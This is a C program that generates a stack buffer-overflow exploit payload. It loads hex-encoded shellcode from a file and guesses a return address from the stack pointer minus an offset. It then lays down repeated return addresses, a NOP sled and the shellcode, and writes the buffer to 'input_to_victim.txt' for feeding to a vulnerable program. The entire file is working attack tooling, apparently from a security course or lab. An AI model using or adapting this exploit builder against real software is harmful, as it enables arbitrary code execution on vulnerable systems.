#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define NOP 0x90
#define OUTPUT_FILE "input_to_victim.txt"

unsigned long get_rsp(void) {
	__asm__("mov %rsp, %rax");
}

int main(int argc, char *argv[]) {
	char *buffer;
	long buff_size, offset, nop_len;	
	long addr;
	char *ptr;
	long *ptr_addr;

	FILE *fp;
	char c;
	char *filename;
	int shellcode_len = 0;

	if(argc<3){
		printf("supply required arguments\n");
		printf("usage: filename buffer_size offset nop_len\n");
		return -1;
	}


	filename = argv[1];
	buff_size = strtol(argv[2], 0, 10);
	nop_len = buff_size/2;
	if(argc>3) {
		offset = strtol(argv[3], 0, 10);
	}
	if(argc>4) {
		nop_len = strtol(argv[4], 0, 10);
	}

	//read the shellcode
	fp = fopen(filename, "r");
	while((c = fgetc(fp)) != EOF ) {
		shellcode_len ++; 
	}
	fclose(fp);

	int i=0;
	char shellcode_char[shellcode_len+1];
	fp = fopen(filename, "r");
	while((c = fgetc(fp)) != EOF ) {
		shellcode_char[i] = c; 
		i++;
	}
	fclose(fp);

	shellcode_len/=2;
	char tmp;
	char shellcode_hex[shellcode_len];
	for(int i=0; i<shellcode_len; i++){
		tmp = shellcode_char[2*i+2];
		shellcode_char[2*i+2] = 0;
		shellcode_hex[i] = strtol(&shellcode_char[2*i], NULL, 16);
		shellcode_char[2*i+2] = tmp;
		// printf("%c%c-%d->", shellcode_char[2*i], shellcode_char[2*i+1], shellcode_hex[i]);
	}
	printf("shell code len %d bytes\n", shellcode_len);


	buffer = malloc(buff_size);

	addr = get_rsp() - offset;
	printf("address used: 0x%08lx\n", addr);


	ptr = buffer;
	ptr_addr = (long *)buffer;
	for(int i=0; i<buff_size; i+=8){
		*(ptr_addr) = addr;
		ptr_addr++;
	}

	for(int i=0; i<nop_len; i++) {
		buffer[i] = NOP;
	}

	ptr = buffer + nop_len;
	for(int i=0; i<shellcode_len; i++){
		*(ptr) = shellcode_hex[i];
		ptr++;
	}
	buffer[buff_size-1] = 0;

	fp = fopen(OUTPUT_FILE, "w+");
	fprintf(fp, "%s", buffer);


	return 0;
}